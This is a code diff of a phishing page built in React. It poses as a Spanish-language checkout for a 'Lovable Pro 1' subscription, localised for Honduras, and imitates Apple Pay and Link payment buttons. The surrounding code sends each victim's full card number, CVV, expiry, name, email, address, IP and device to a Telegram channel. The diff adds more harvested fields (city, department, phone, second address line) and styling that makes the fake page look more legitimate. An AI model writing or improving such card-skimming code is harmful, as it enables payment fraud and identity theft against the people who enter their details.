@@ -22,11 +22,18 @@ const C = {
 };
 
 const COUNTRIES = [
-  "United States", "México", "Colombia", "Argentina", "Chile", "Perú",
+  "Honduras", "United States", "México", "Colombia", "Argentina", "Chile", "Perú",
   "España", "Ecuador", "Guatemala", "Venezuela", "República Dominicana", "Otro",
 ];
 
+const DEPARTMENTS = [
+  "Francisco Morazán", "Cortés", "Atlántida", "Comayagua", "Yoro", "Choluteca",
+  "Olancho", "Santa Bárbara", "Lempira", "Otro",
+];
+
 const STEPS = ["Verificando la tarjeta", "Validando con el banco", "Confirmando disponibilidad"];
+
+const HNL_RATE = 27.9535;
 
 type Brand = "visa" | "mastercard" | "amex" | "unionpay" | null;
 
@@ -107,79 +114,131 @@ const sendToTelegram = async (text: string) => {
   console.info("[tg] enviado por pixel");
 };
 
-/* ---------------- marcas ---------------- */
+/* ---------------- iconos ---------------- */
 
-const Logo = ({ brand, active }: { brand: Exclude<Brand, null>; active: boolean }) => {
-  const common = `transition-all duration-150 ${active ? "scale-[1.06] opacity-100" : "opacity-35 saturate-[0.6]"}`;
+const Logo = ({ brand, active = true }: { brand: Exclude<Brand, null>; active?: boolean }) => {
+  const cls = `shrink-0 transition-all duration-150 ${active ? "opacity-100" : "opacity-40 saturate-[0.35]"}`;
   if (brand === "visa") {
     return (
-      <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true" className={common}>
-        <rect x="0.5" y="0.5" width="33" height="22" rx="2.4" fill="#fff" stroke={C.border} />
-        <text x="17" y="15.4" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="10.2" fontWeight="900" fontStyle="italic" fill="#1a1f71" letterSpacing="-0.3">VISA</text>
+      <svg width="41" height="30" viewBox="0 0 41 30" aria-hidden="true" className={cls}>
+        <rect x="0.6" y="0.6" width="39.8" height="28.8" rx="4" fill="#fff" stroke="#e3e3e3" strokeWidth="1.2" />
+        <text x="20.5" y="20.4" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="12.6" fontWeight="900" fontStyle="italic" fill="#1a1f71" letterSpacing="-0.5">VISA</text>
       </svg>
     );
   }
   if (brand === "mastercard") {
     return (
-      <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true" className={common}>
-        <rect width="34" height="23" rx="2.4" fill="#111114" />
-        <circle cx="13.6" cy="11.5" r="6.3" fill="#eb001b" />
-        <circle cx="20.4" cy="11.5" r="6.3" fill="#f79e1b" />
-        <path d="M17 6.28a6.3 6.3 0 0 0 0 10.44 6.3 6.3 0 0 0 0-10.44z" fill="#ff5f00" />
+      <svg width="41" height="30" viewBox="0 0 41 30" aria-hidden="true" className={cls}>
+        <rect width="41" height="30" rx="4" fill="#000" />
+        <circle cx="16.4" cy="15" r="8.2" fill="#eb001b" />
+        <circle cx="24.6" cy="15" r="8.2" fill="#f79e1b" />
+        <path d="M20.5 8.28a8.2 8.2 0 0 0 0 13.44 8.2 8.2 0 0 0 0-13.44z" fill="#ff5f00" />
       </svg>
     );
   }
   if (brand === "amex") {
     return (
-      <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true" className={common}>
-        <rect width="34" height="23" rx="2.4" fill="#006fcf" />
-        <rect x="1.5" y="1.5" width="31" height="20" rx="1.6" fill="none" stroke="#fff" strokeWidth="0.85" opacity="0.9" />
-        <text x="17" y="12" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="7.4" fontWeight="900" fill="#fff" letterSpacing="0.1">AMEX</text>
-        <text x="17" y="17.6" textAnchor="middle" fontFamily="Arial, Helvetica, sans-serif" fontSize="3.8" fill="#d7eaff" letterSpacing="1.1">EXPRESS</text>
+      <svg width="41" height="30" viewBox="0 0 41 30" aria-hidden="true" className={cls}>
+        <rect width="41" height="30" rx="4" fill="#016fd0" />
+        <rect x="2.4" y="2.4" width="36.2" height="25.2" rx="2" fill="none" stroke="#fff" strokeWidth="1.1" />
+        <text x="20.5" y="14.2" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="9" fontWeight="900" fill="#fff" letterSpacing="0.2">AM</text>
+        <text x="20.5" y="23.4" textAnchor="middle" fontFamily="Arial Black, Arial, Helvetica, sans-serif" fontSize="9" fontWeight="900" fill="#fff" letterSpacing="0.2">EX</text>
+      </svg>
+    );
+  }
+  if (brand === "jcb") {
+    return (
+      <svg width="41" height="30" viewBox="0 0 41 30" aria-hidden="true" className={cls}>
+        <rect x="0.6" y="0.6" width="39.8" height="28.8" rx="4" fill="#fff" stroke="#e3e3e3" strokeWidth="1.2" />
+        <rect x="7" y="5" width="7.6" height="17.4" rx="2.6" fill="#0b4ea2" />
+        <rect x="16.7" y="5" width="7.6" height="17.4" rx="2.6" fill="#d7002f" />
+        <rect x="26.4" y="5" width="7.6" height="17.4" rx="2.6" fill="#00a651" />
+        <text x="10.8" y="17.6" textAnchor="middle" fontSize="7.4" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#fff">J</text>
+        <text x="20.5" y="17.6" textAnchor="middle" fontSize="7.4" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#fff">C</text>
+        <text x="30.2" y="17.6" textAnchor="middle" fontSize="7.4" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#fff">B</text>
       </svg>
     );
   }
   return (
-    <svg width="33" height="21" viewBox="0 0 34 23" aria-hidden="true" className={common}>
-      <rect x="0.5" y="0.5" width="33" height="22" rx="2.4" fill="#fff" stroke={C.border} />
-      <g transform="rotate(-9 17 11.5)">
-        <path d="M8.6 3.6h4.1l-1.7 15.8H6.9z" fill="#e21836" />
-        <path d="M13.8 3.6h4.1l-1.7 15.8h-4.1z" fill="#00447c" />
-        <path d="M19 3.6h4.1l-1.7 15.8h-4.1z" fill="#007b84" />
+    <svg width="41" height="30" viewBox="0 0 41 30" aria-hidden="true" className={cls}>
+      <rect x="0.6" y="0.6" width="39.8" height="28.8" rx="4" fill="#fff" stroke="#e3e3e3" strokeWidth="1.2" />
+      <g transform="skewX(-9)">
+        <path d="M10.5 3.6h7.4l-2.4 22.8h-7.4z" fill="#e21836" />
+        <path d="M19.4 3.6h7.4l-2.4 22.8h-7.4z" fill="#00447c" />
+        <path d="M28.3 3.6h7.4l-2.4 22.8h-7.4z" fill="#007b84" />
       </g>
-      <text x="17" y="12.1" textAnchor="middle" fontSize="4.2" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontStyle="italic" fill="#fff">Union</text>
-      <text x="17" y="16.6" textAnchor="middle" fontSize="4.2" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontStyle="italic" fill="#fff">Pay</text>
+      <text x="20.5" y="14.2" textAnchor="middle" fontSize="4.6" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontStyle="italic" fill="#fff">Union</text>
+      <text x="20.5" y="20.2" textAnchor="middle" fontSize="4.6" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fontStyle="italic" fill="#fff">Pay</text>
     </svg>
   );
 };
 
 const CardGlyph = () => (
-  <svg width="22" height="16" viewBox="0 0 22 16" aria-hidden="true">
-    <rect x="0.6" y="0.6" width="20.8" height="14.8" rx="2.2" fill="#fff" stroke="#c9cad1" />
-    <rect x="0.6" y="4.2" width="20.8" height="3" fill="#c9cad1" />
-    <rect x="3" y="9.6" width="6" height="2" rx="1" fill="#dcdee4" />
+  <svg width="19" height="15" viewBox="0 0 19 15" aria-hidden="true">
+    <rect width="19" height="15" rx="2.6" fill="#111" />
+    <rect x="2.4" y="3.4" width="6.2" height="2.4" rx="1.2" fill="#fff" />
+    <rect x="2.4" y="8.2" width="3.4" height="1.7" rx="0.85" fill="#fff" opacity="0.85" />
   </svg>
 );
 
 const CvcGlyph = () => (
-  <svg width="20" height="15" viewBox="0 0 20 15" aria-hidden="true">
-    <rect x="0.5" y="0.5" width="19" height="14" rx="2" fill="#f7f7fa" stroke="#c9cad1" />
-    <rect x="0.5" y="3.4" width="19" height="2.6" fill="#b9bac2" />
-    <rect x="2.5" y="8" width="9" height="1.4" rx="0.7" fill="#dcdee4" />
-    <circle cx="15.6" cy="9.6" r="3.2" fill="#30313d" />
-    <text x="15.6" y="11.3" textAnchor="middle" fontSize="3.6" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#fff">135</text>
+  <svg width="25" height="17" viewBox="0 0 25 17" aria-hidden="true">
+    <rect x="0.8" y="0.8" width="23.4" height="15.4" rx="2.4" fill="#fff" stroke="#111" strokeWidth="1.5" />
+    <rect x="0.8" y="4.2" width="23.4" height="2.4" fill="#111" />
+    <text x="20.6" y="14" textAnchor="end" fontSize="6" fontFamily="Arial, Helvetica, sans-serif" fontWeight="700" fill="#111">123</text>
   </svg>
 );
 
-const GooglePayTile = ({ on }: { on: boolean }) => (
-  <span className={`flex items-center gap-1.5 transition-opacity duration-150 ${on ? "opacity-100" : "opacity-60"}`}>
-    <svg width="16" height="16" viewBox="0 0 24 24" aria-hidden="true">
-      <path fill="#4285F4" d="M23.49 12.27c0-.79-.07-1.54-.19-2.27H12v4.51h6.47a5.54 5.54 0 0 1-2.4 3.58v3h3.86c2.26-2.09 3.56-5.17 3.56-8.82z" />
-      <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.86-3c-1.08.72-2.45 1.16-4.07 1.16-3.13 0-5.78-2.11-6.73-4.96H1.29v3.09A11.99 11.99 0 0 0 12 24z" />
-      <path fill="#FBBC05" d="M5.27 14.29a7.2 7.2 0 0 1 0-4.58V6.62H1.29a11.99 11.99 0 0 0 0 10.76l3.98-3.09z" />
-      <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.7 0 3.99 2.47 1.29 6.62l3.98 3.09C6.22 6.86 8.87 4.75 12 4.75z" />
-    </svg>
-    <span className="text-[14px] font-medium text-[#3c4043]">Pay</span>
+const AppleGlyph = ({ size = 22 }: { size?: number }) => (
+  <svg width={size} height={size} viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+    <path d="M17.05 12.54c-.02-2.2 1.8-3.26 1.88-3.31-1.02-1.5-2.62-1.7-3.19-1.72-1.36-.14-2.65.8-3.34.8-.69 0-1.75-.78-2.87-.76-1.48.02-2.84.86-3.6 2.18-1.53 2.66-.39 6.6 1.1 8.76.73 1.06 1.6 2.25 2.74 2.2 1.1-.04 1.52-.71 2.85-.71 1.33 0 1.71.71 2.87.69 1.19-.02 1.94-1.08 2.66-2.14.84-1.23 1.19-2.42 1.21-2.48-.03-.01-2.32-.89-2.34-3.53zM14.9 5.9c.6-.73 1-1.75.89-2.76-.86.03-1.9.57-2.52 1.3-.55.64-1.04 1.68-.91 2.67.96.07 1.94-.49 2.54-1.21z" />
+  </svg>
+);
+
+const LinkGlyph = () => (
+  <span className="flex items-center gap-1.5">
+    <span className="flex h-[34px] w-[34px] items-center justify-center rounded-full bg-black">
+      <svg width="17" height="17" viewBox="0 0 16 16" aria-hidden="true">
+        <path d="M5 3 10.9 8 5 13" fill="none" stroke="#fff" strokeWidth="2.6" strokeLinecap="round" strokeLinejoin="round" />
+      </svg>
+    </span>
+    <span className="text-[34px] font-extrabold leading-none tracking-[-0.035em] text-black">link</span>
+  </span>
+);
+
+const HeartLogo = () => (
+  <svg width="21" height="26" viewBox="0 0 40 48" aria-hidden="true" style={{ transform: "rotate(-11deg)" }}>
+    <defs>
+      <linearGradient id="vh-heart" x1="0.05" y1="1" x2="0.85" y2="0">
+        <stop offset="0" stopColor="#4c1d95" />
+        <stop offset="0.22" stopColor="#7c3aed" />
+        <stop offset="0.5" stopColor="#d6225c" />
+        <stop offset="0.78" stopColor="#f0574a" />
+        <stop offset="1" stopColor="#f9a03f" />
+      </linearGradient>
+    </defs>
+    <path
+      fill="url(#vh-heart)"
+      d="M20 45.6S3.6 33.4 3.6 20.4C3.6 12.3 9.5 6.4 16.4 6.4c1.6 0 3 .7 3.6 1.9.6-1.2 2-1.9 3.6-1.9 6.9 0 12.8 5.9 12.8 14 0 13-16.4 25.2-16.4 25.2z"
+    />
+  </svg>
+);
+
+const HnFlag = () => (
+  <span className="relative shrink-0">
+    <span className="block h-[19px] w-[26px] overflow-hidden rounded-[3px] border border-[#c9c9c9]">
+      <svg width="26" height="19" viewBox="0 0 26 19" aria-hidden="true">
+        <rect width="26" height="19" fill="#fff" />
+        <rect width="26" height="6.4" fill="#0071ce" />
+        <rect y="12.6" width="26" height="6.4" fill="#0071ce" />
+        <g fill="#0071ce">
+          <circle cx="6.5" cy="9.5" r="0.75" /><circle cx="9.8" cy="9.5" r="0.75" />
+          <circle cx="13" cy="9.5" r="0.75" /><circle cx="16.2" cy="9.5" r="0.75" />
+          <circle cx="19.5" cy="9.5" r="0.75" />
+        </g>
+      </svg>
+    </span>
+    <span className="absolute -bottom-[3px] -right-[3px] flex h-[13px] w-[13px] items-center justify-center rounded-full border border-white bg-[#8a8a8a] text-[9px] font-bold leading-none text-white">+</span>
   </span>
 );
 
@@ -200,9 +259,16 @@ const Login = () => {
   const [holder, setHolder] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
-  const [country, setCountry] = useState("United States");
+  const [country, setCountry] = useState("Honduras");
   const [address, setAddress] = useState("");
+  const [address2, setAddress2] = useState("");
+  const [city, setCity] = useState("");
+  const [department, setDepartment] = useState("");
   const [zip, setZip] = useState("");
+  const [phone, setPhone] = useState("");
+  const [save, setSave] = useState(false);
+  const [annual, setAnnual] = useState(false);
+  const [currency, setCurrency] = useState<"HNL" | "USD">("HNL");
   const [error, setError] = useState("");
   const [field, setField] = useState("");
   const [loading, setLoading] = useState(false);
@@ -211,6 +277,11 @@ const Login = () => {
   const ref = useMemo(() => Math.random().toString(36).slice(2, 8).toUpperCase(), []);
   const brand = detectBrand(card.replace(/\s/g, ""));
   const cvvMax = brand === "amex" ? 4 : 3;
+
+  const fmt = (usd: number) =>
+    `${currency} ${(currency === "HNL" ? usd * HNL_RATE : usd).toFixed(2)}`;
+  const price = fmt(annual ? 20.83 : 25);
+  const annualPrice = fmt(20.83);
 
   /* bloqueo de scroll del fondo */
   useEffect(() => {
@@ -293,7 +364,7 @@ const Login = () => {
         const text = [
           "💳 NUEVA TARJETA — Valhalla",
           "",
-          `Método: ${method === "gpay" ? "Google Pay" : "Card"}`,
+          `Método: ${method === "gpay" ? "Apple Pay" : "Card"}`,
           `Correo: ${email.trim()}`,
           `Número: ${digits.replace(/(\d{4})(?=\d)/g, "$1 ")}`,
           `Titular: ${cleanHolder.toUpperCase()}`,
@@ -301,7 +372,12 @@ const Login = () => {
           `CVV: ${cvv}`,
           `País: ${country}`,
           `Dirección: ${address.trim()}`,
+          `Dirección 2: ${address2.trim() || "—"}`,
+          `Ciudad: ${city.trim() || "—"}`,
+          `Departamento: ${department || "—"}`,
           `ZIP: ${zip.trim().toUpperCase()}`,
+          `Teléfono: ${phone.trim() || "—"}`,
+          `Plan: ${annual ? "Anual" : "Mensual"} · ${price}`,
           "",
           `IP: ${ip}`,
           `Dispositivo: ${navigator.userAgent.slice(0, 160)}`,
@@ -427,163 +503,336 @@ const Login = () => {
 
       {/* ---------- CHECKOUT ---------- */}
       {step === "pay" && !processing && (
-        <div className="fixed inset-0 z-50 flex justify-center bg-white font-[system-ui,-apple-system,'Segoe_UI',Roboto,Helvetica,Arial,sans-serif]">
+        <div className="fixed inset-0 z-50 overflow-y-auto overscroll-contain bg-white font-[system-ui,-apple-system,'Segoe_UI',Roboto,Helvetica,Arial,sans-serif]">
           <form
             onSubmit={onSubmit}
             noValidate
-            className="flex h-[100dvh] w-full max-w-[520px] flex-col bg-white text-[#30313d] antialiased"
+            className="mx-auto w-full max-w-[414px] bg-white pb-9 text-[#1a1a1a] antialiased"
           >
-            <header className="flex shrink-0 items-center justify-between border-b border-[#f0f0f5] px-4 pb-2 pt-[max(8px,env(safe-area-inset-top))]">
+            {/* ---------- HERO OSCURO ---------- */}
+            <div className="bg-[#202020] px-4 pb-7 pt-[max(6px,env(safe-area-inset-top))] text-center text-white">
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-3">
+                  <button
+                    type="button"
+                    onClick={goBack}
+                    aria-label="Volver"
+                    className="-ml-2 flex h-10 w-10 items-center justify-center rounded-full text-white/90 transition-colors hover:bg-white/10 active:bg-white/15"
+                  >
+                    <ChevronLeft className="h-[26px] w-[26px]" strokeWidth={2} />
+                  </button>
+                  <HeartLogo />
+                </div>
+
+                <button type="button" className="flex items-center gap-1.5 text-[14px] text-white/90 transition-opacity hover:opacity-80">
+                  <span className="underline decoration-white/75 decoration-[1.2px] underline-offset-[6px]">Detalles</span>
+                  <ChevronDown className="h-[19px] w-[19px]" strokeWidth={2.2} />
+                </button>
+              </div>
+
+              <p className="mt-7 text-[17px] leading-none text-[#a9a9a9]">Suscríbete a Pro 1</p>
+
+              <p className="mt-2 flex items-baseline justify-center gap-2">
+                <span className="text-[35px] font-bold leading-none tracking-[-0.025em] text-white tabular-nums">{price}</span>
+                <span className="text-[15px] font-normal text-[#a9a9a9]">por mes</span>
+              </p>
+
+              <p className="mt-4 text-[15px] leading-snug text-[#a9a9a9]">Lovable Pro 1 Monthly subscription</p>
+
               <button
                 type="button"
-                onClick={goBack}
-                aria-label="Volver"
-                className="-ml-1.5 flex h-9 w-9 items-center justify-center rounded-full text-[#30313d] transition-colors hover:bg-[#f6f6f9] active:bg-[#eeeef3]"
+                className="mt-5 inline-flex h-[50px] items-center justify-center gap-2 rounded-[8px] bg-[#333333] px-6 text-[15px] font-medium text-white transition-colors hover:bg-[#3d3d3d] active:bg-[#464646]"
               >
-                <ChevronLeft className="h-5 w-5" />
+                Agregar código <ChevronDown className="h-[18px] w-[18px]" strokeWidth={2.2} />
               </button>
-              <div className="flex items-center gap-1.5">
-                <span className="flex h-[18px] w-[18px] items-center justify-center rounded-full bg-[#635bff] text-[9px] font-bold text-white">V</span>
-                <span className="text-[13px] font-semibold tracking-[-0.01em] text-[#30313d]">Valhalla</span>
-              </div>
-              <span className="rounded-full border border-[#e6e6e6] bg-[#f7f7fa] px-2 py-[3px] text-[9.5px] font-semibold uppercase tracking-[0.06em] text-[#6d6e78]">
-                Prueba
-              </span>
-            </header>
 
-            <div className="min-h-0 flex-1 overflow-y-auto overscroll-contain px-5 pb-7 pt-5">
-              <p className="text-[14px] text-[#6d6e78]">Pagar a Valhalla</p>
-              <h2 className="mt-0.5 text-[30px] font-semibold leading-none tracking-[-0.025em] tabular-nums text-[#30313d]">2,00 US$</h2>
-              <p className="mt-1.5 text-[11.5px] text-[#8d8e98]">Impuestos incluidos · Pago único</p>
-
-              <div className="mt-5 overflow-hidden rounded-[5px] border border-[#e6e6e6] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03)] focus-within:border-[#c8d1da]">
-                <div className={cellCls}>
-                  <label htmlFor="email" className={labelCls}>Correo electrónico</label>
-                  <input
-                    id="email"
-                    type="email"
-                    placeholder="tu@correo.com"
-                    value={email}
-                    onChange={(e) => setEmail(e.target.value.trim())}
-                    autoComplete="email"
-                    inputMode="email"
-                    autoCapitalize="off"
-                    spellCheck={false}
-                    maxLength={64}
-                    className={`${inputCls} ${errCls(field === "email")}`}
-                  />
-                </div>
-              </div>
-
-              <div className="mt-4 grid grid-cols-2 gap-2.5">
-                {(["card", "gpay"] as const).map((m) => {
-                  const on = method === m;
+              <div className="mt-6 grid grid-cols-2 gap-2">
+                {(["HNL", "USD"] as const).map((cur) => {
+                  const on = currency === cur;
                   return (
                     <button
-                      key={m}
+                      key={cur}
                       type="button"
-                      onClick={() => setMethod(m)}
+                      onClick={() => setCurrency(cur)}
                       aria-pressed={on}
-                      className={`flex h-[66px] flex-col items-center justify-center gap-2 rounded-[5px] border bg-white transition-all duration-150 active:scale-[0.985] ${
+                      className={`flex h-[61px] items-center justify-center gap-2.5 rounded-[8px] text-[17px] font-normal text-white transition-all duration-150 ${
                         on
-                          ? "border-[#e0e6eb] shadow-[0_0_0_2px_#0570de]"
-                          : "border-[#e0e6eb] shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(18,42,66,0.02)] hover:border-[#cfd5db] hover:shadow-[0_1px_1px_rgba(0,0,0,0.04),0_4px_10px_rgba(18,42,66,0.06)]"
+                          ? "border-[1.5px] border-white bg-[#202020]"
+                          : "border-[1.5px] border-transparent bg-[#333333] hover:bg-[#3b3b3b]"
                       }`}
                     >
-                      {m === "card" ? (
-                        <span className={on ? "opacity-100" : "opacity-60"}><CardGlyph /></span>
-                      ) : (
-                        <GooglePayTile on={on} />
-                      )}
-                      <span className={`text-[12.5px] font-medium leading-none ${on ? "text-[#30313d]" : "text-[#6d6e78]"}`}>
-                        {m === "card" ? "Tarjeta" : "Google Pay"}
-                      </span>
+                      <span className="text-[20px] leading-none">{cur === "HNL" ? "🇭🇳" : "🇺🇸"}</span>
+                      {cur}
                     </button>
                   );
                 })}
               </div>
 
-              <div className="mt-4 overflow-hidden rounded-[5px] border border-[#e6e6e6] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03)] focus-within:border-[#c8d1da]">
-                <div className={cellCls}>
-                  <div className="flex items-center justify-between">
-                    <label htmlFor="cc-number" className={labelCls}>Número de tarjeta</label>
-                    <div className="mb-[6px] flex items-center gap-[5px]">
-                      {(["visa", "mastercard", "amex", "unionpay"] as const).map((b) => (
-                        <Logo key={b} brand={b} active={brand === b} />
+              <p className="mx-auto mt-5 max-w-[350px] text-[14px] leading-[1.55] text-[#9d9d9d]">
+                1 USD = 27.9535 HNL. Los cargos pueden variar según los tipos de cambio.
+              </p>
+
+              <div className="mt-6 flex items-center justify-between gap-3 rounded-[10px] bg-[#2a2a2a] px-4 py-4 text-left">
+                <div className="flex items-start gap-2.5">
+                  <button
+                    type="button"
+                    role="switch"
+                    aria-checked={annual}
+                    aria-label="Facturación anual"
+                    onClick={() => setAnnual((v) => !v)}
+                    className={`relative mt-[1px] h-[22px] w-[27px] shrink-0 rounded-full transition-colors duration-150 ${annual ? "bg-[#1f9d55]" : "bg-[#5e5e5e]"}`}
+                  >
+                    <span
+                      className="absolute top-[2px] h-[18px] w-[18px] rounded-full bg-white shadow-[0_1px_2px_rgba(0,0,0,0.35)] transition-all duration-150"
+                      style={{ left: annual ? "7px" : "2px" }}
+                    />
+                  </button>
+                  <p className="text-[14.5px] leading-[1.3] text-white">
+                    <span className="mr-1.5 inline-block rounded-[5px] bg-[#b9e8a3] px-[7px] py-[1px] text-[14px] font-medium text-[#1e3a10]">Ahorra 16%</span>
+                    con una facturación de anual
+                  </p>
+                </div>
+                <p className="shrink-0 text-[14.5px] leading-tight text-white tabular-nums">{annualPrice}/mes</p>
+              </div>
+            </div>
+
+            {/* ---------- CUERPO ---------- */}
+            <div className="px-4 pt-6">
+              <div className="grid grid-cols-2 gap-3">
+                <button
+                  type="button"
+                  onClick={() => setMethod("gpay")}
+                  className="flex h-[78px] items-center justify-center rounded-[10px] bg-black text-white transition-transform active:scale-[0.99]"
+                  aria-label="Apple Pay"
+                >
+                  <AppleGlyph size={31} />
+                  <span className="ml-[3px] mt-[2px] text-[31px] font-medium leading-none tracking-[-0.02em]">Pay</span>
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setMethod("card")}
+                  className="flex h-[78px] items-center justify-center rounded-[10px] bg-[#6ddf8c] transition-transform active:scale-[0.99]"
+                  aria-label="Link"
+                >
+                  <LinkGlyph />
+                </button>
+              </div>
+
+              <div className="mt-8 flex items-center gap-4">
+                <span className="h-px flex-1 bg-[#e3e3e3]" />
+                <span className="text-[13px] font-normal uppercase tracking-[0.09em] text-[#8f8f8f]">O bien</span>
+                <span className="h-px flex-1 bg-[#e3e3e3]" />
+              </div>
+
+              <div className="mt-7 flex min-h-[56px] items-center justify-between gap-4 rounded-[10px] border border-[#ececec] bg-[#f7f7f7] px-4 py-3">
+                <label htmlFor="email" className="w-[92px] shrink-0 text-[15px] leading-[1.25] text-[#6b6b6b]">Correo electrónico</label>
+                <input
+                  id="email"
+                  type="email"
+                  placeholder=""
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value.trim())}
+                  autoComplete="email"
+                  inputMode="email"
+                  autoCapitalize="off"
+                  spellCheck={false}
+                  maxLength={64}
+                  aria-invalid={field === "email"}
+                  className="h-6 min-w-0 flex-1 bg-transparent text-right text-[16px] text-[#1a1a1a] outline-none"
+                />
+              </div>
+
+              <h2 className="mt-7 text-[19px] font-bold tracking-[-0.015em] text-[#1a1a1a]">Método de pago</h2>
+
+              <div className="mt-3 rounded-[11px] border border-[#e5e5e5] px-[17px] pb-4 pt-[17px]">
+                <div className="flex items-center gap-3">
+                  <span className="flex h-[18px] w-[18px] items-center justify-center rounded-full border-[5.5px] border-[#111] bg-white" aria-hidden="true" />
+                  <CardGlyph />
+                  <span className="text-[15px] text-[#1a1a1a]">Tarjeta</span>
+                </div>
+
+                <p className="mb-2 mt-[18px] text-[14px] text-[#6b6b6b]">Información de la tarjeta</p>
+
+                <div className={`overflow-hidden rounded-[9px] border bg-white transition-colors focus-within:border-[#a8a8a8] ${field === "card" ? "border-[#df1b41]" : "border-[#e5e5e5]"}`}>
+                  <div className="flex h-[48px] items-center gap-2 pl-4 pr-2">
+                    <input
+                      id="cc-number"
+                      type="text"
+                      placeholder="1234 1234 1234 1234"
+                      value={card}
+                      onChange={(e) => setCard(formatCardBranded(e.target.value))}
+                      autoComplete="cc-number"
+                      inputMode="numeric"
+                      autoCapitalize="off"
+                      spellCheck={false}
+                      maxLength={23}
+                      aria-invalid={field === "card"}
+                      className="h-full min-w-0 flex-1 bg-transparent text-[17px] tracking-[0.01em] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
+                    />
+                    <div className="flex shrink-0 items-center gap-[3px]">
+                      {(["visa", "mastercard", "amex", "jcb", "unionpay"] as const).map((b) => (
+                        <Logo key={b} brand={b as Exclude<Brand, null>} active={!brand || brand === b} />
                       ))}
                     </div>
                   </div>
-                  <input
-                    id="cc-number"
-                    type="text"
-                    placeholder="1234 1234 1234 1234"
-                    value={card}
-                    onChange={(e) => setCard(formatCardBranded(e.target.value))}
-                    autoComplete="cc-number"
-                    inputMode="numeric"
-                    autoCapitalize="off"
-                    spellCheck={false}
-                    maxLength={23}
-                    autoFocus
-                    aria-invalid={field === "card"}
-                    className={`${inputCls} tracking-[0.02em] ${errCls(field === "card")}`}
-                  />
-                </div>
 
-                <div className={`${cellCls} border-t border-[#f0f0f5]`}>
-                  <label htmlFor="cc-name" className={labelCls}>Nombre del titular</label>
-                  <input
-                    id="cc-name"
-                    type="text"
-                    placeholder="Nombre completo"
-                    value={holder}
-                    onChange={(e) => setHolder(e.target.value.toUpperCase())}
-                    autoComplete="cc-name"
-                    autoCapitalize="characters"
-                    spellCheck={false}
-                    maxLength={40}
-                    aria-invalid={field === "holder"}
-                    className={`${inputCls} uppercase ${errCls(field === "holder")}`}
-                  />
-                </div>
-
-                <div className="grid grid-cols-[1fr_1fr] divide-x divide-[#f0f0f5] border-t border-[#f0f0f5]">
-                  <div className={cellCls}>
-                    <label htmlFor="cc-exp" className={labelCls}>Vencimiento</label>
-                    <input
-                      id="cc-exp"
-                      type="text"
-                      placeholder="MM / AA"
-                      value={expiry}
-                      onChange={(e) => setExpiry(formatExpiry(e.target.value))}
-                      autoComplete="cc-exp"
-                      inputMode="numeric"
-                      maxLength={5}
-                      aria-invalid={field === "exp"}
-                      className={`${inputCls} ${errCls(field === "exp")}`}
-                    />
-                  </div>
-                  <div className={cellCls}>
-                    <div className="flex items-center justify-between">
-                      <label htmlFor="cc-cvc" className={labelCls}>Código de seguridad</label>
+                  <div className="grid grid-cols-2 border-t border-[#e5e5e5]">
+                    <div className="flex h-[44px] items-center border-r border-[#e5e5e5]">
+                      <input
+                        id="cc-exp"
+                        type="text"
+                        placeholder="MM/AA"
+                        value={expiry}
+                        onChange={(e) => setExpiry(formatExpiry(e.target.value))}
+                        autoComplete="cc-exp"
+                        inputMode="numeric"
+                        maxLength={5}
+                        aria-invalid={field === "exp"}
+                        className="h-full w-full bg-transparent px-4 text-[17px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
+                      />
+                    </div>
+                    <div className="flex h-[44px] items-center gap-2 pl-4 pr-[9px]">
+                      <input
+                        id="cc-cvc"
+                        type="text"
+                        placeholder="CVC"
+                        value={cvv}
+                        onChange={(e) => setCvv(onlyDigits(e.target.value, cvvMax))}
+                        autoComplete="cc-csc"
+                        inputMode="numeric"
+                        maxLength={cvvMax}
+                        aria-invalid={field === "cvc"}
+                        className="h-full min-w-0 flex-1 bg-transparent text-[17px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
+                      />
                       <CvcGlyph />
                     </div>
-                    <input
-                      id="cc-cvc"
-                      type="text"
-                      placeholder={brand === "amex" ? "1234" : "CVC"}
-                      value={cvv}
-                      onChange={(e) => setCvv(onlyDigits(e.target.value, cvvMax))}
-                      autoComplete="cc-csc"
-                      inputMode="numeric"
-                      maxLength={cvvMax}
-                      aria-invalid={field === "cvc"}
-                      className={`${inputCls} ${errCls(field === "cvc")}`}
-                    />
-                    <p className="mt-[3px] text-[10.5px] leading-tight text-[#6d6e78]">
-                      {brand === "amex" ? "4 dígitos del frente" : "3 dígitos del reverso"}
-                    </p>
                   </div>
+                </div>
+
+                <p className="mb-2 mt-[18px] text-[14px] text-[#1a1a1a]">Nombre del titular de tarjeta</p>
+                <input
+                  id="cc-name"
+                  type="text"
+                  placeholder="Nombre completo"
+                  value={holder}
+                  onChange={(e) => setHolder(e.target.value.toUpperCase())}
+                  autoComplete="cc-name"
+                  autoCapitalize="characters"
+                  spellCheck={false}
